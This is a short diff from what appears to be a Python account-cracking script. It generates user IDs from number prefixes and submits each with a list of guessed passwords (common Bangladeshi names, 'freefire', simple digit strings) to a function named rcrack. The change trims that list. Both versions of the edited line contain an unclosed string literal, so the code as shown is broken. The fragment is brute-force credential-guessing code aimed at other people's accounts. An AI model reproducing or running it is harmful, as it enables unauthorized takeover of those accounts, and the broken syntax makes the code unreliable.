@@ -224,7 +224,7 @@ def Broken():
         print("\x1b[38;5;155m==================================================\n")
         for guru in user:
             uid = mahi+ex+new+guru
-            pwx = [mahi+ex+new+guru,new+guru,ex+guru,mahi+ex+new,'bangla','Bangladesh','freefire','sadiya','bangladesh','sabbir','afsana','nusrat','ma baba','sabbir12','nusrat1122','sadiya123','pabg123','908070','@nusrat1','arif1020','sadiya1122]
+            pwx = [mahi+ex+new+guru,new+guru,ex+guru,mahi+ex+new,'bangla','Bangladesh','freefire','sadiya','bangladesh','sabbir','afsana','nusrat','ma baba',']
             Broken.submit(rcrack,uid,pwx,tl) 
     print('\n')
     print('\033[1;32m==================================================')
